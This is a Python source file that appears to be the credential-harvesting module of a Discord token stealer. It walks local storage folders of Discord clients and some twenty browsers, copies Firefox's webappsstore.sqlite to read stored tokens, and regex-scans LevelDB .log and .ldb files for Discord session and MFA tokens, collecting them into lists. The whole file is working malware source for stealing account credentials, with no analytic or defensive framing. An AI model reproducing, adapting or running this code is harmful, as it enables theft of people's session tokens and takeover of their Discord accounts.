import os
import re
import sqlite3
from base64 import b64decode
from shutil import copyfile

TokenList = []
PlatformList = []

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")

Discord_Path = {
    "Discord": ROAMING + "\\Discord\\Local Storage\\leveldb",
    "Lightcord": ROAMING + "\\Lightcord\\Local Storage\\leveldb",
    "PTB": ROAMING + "\\discordptb\\Local Storage\\leveldb",
    "Canary": ROAMING + "\\discordcanary\\Local Storage\\leveldb",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
    "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
    "Firefox": ROAMING + "\\Mozilla\\Firefox\\Profiles\\",

    "Amigo": LOCAL + "\\Amigo\\User Data\\Local Storage\\leveldb",
    "Torch": LOCAL + "\\Torch\\User Data\\Local Storage\\leveldb",
    "Kometa": LOCAL + "\\Kometa\\User Data\\Local Storage\\leveldb",
    "Orbitum": LOCAL + "\\Orbitum\\User Data\\Local Storage\\leveldb",
    "CentBrowser": LOCAL + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
    "7Star": LOCAL + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
    "Sputnik": LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
    "Vivaldi": LOCAL + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
    "Chrome SxS": LOCAL + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
    "Epic Privacy": LOCAL + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
    "Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    "Uran": LOCAL + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
    "Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
    "Opera Neon": LOCAL + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
}


def Grabber(temp_dir):
    for platform, path in Discord_Path.items():
        if platform == "Firefox":
            for root, dirs, files in os.walk(path):
                for dir in dirs:
                    if not ".default" in dir:
                        pass
                    else:
                        if not os.path.isdir(temp_dir + 'firefoxtoken\\'):
                            os.mkdir(temp_dir + 'firefoxtoken\\')
                        try:
                            copyfile(path + dir + '\\' + 'webappsstore.sqlite',
                                     temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
                            connection = sqlite3.connect(temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
                            cursor = connection.cursor()
                            cursor.execute('SELECT key, value FROM webappsstore2')
                            values = cursor.fetchall()
                            for value in values:
                                if value[0] == "token":
                                    token = value[1].replace('"', '')
                                    try:
                                        t = b64decode(token[:24])
                                        int(t.decode())
                                    except Exception:
                                        pass
                                    else:
                                        TokenList.append(token)
                                        PlatformList.append(platform)
                                else:
                                    continue
                        except Exception:
                            pass
        else:
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for l in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for Token in re.findall(regex, l):
                            TokenList.append(Token)
                            PlatformList.append(platform)
    return TokenList, PlatformList
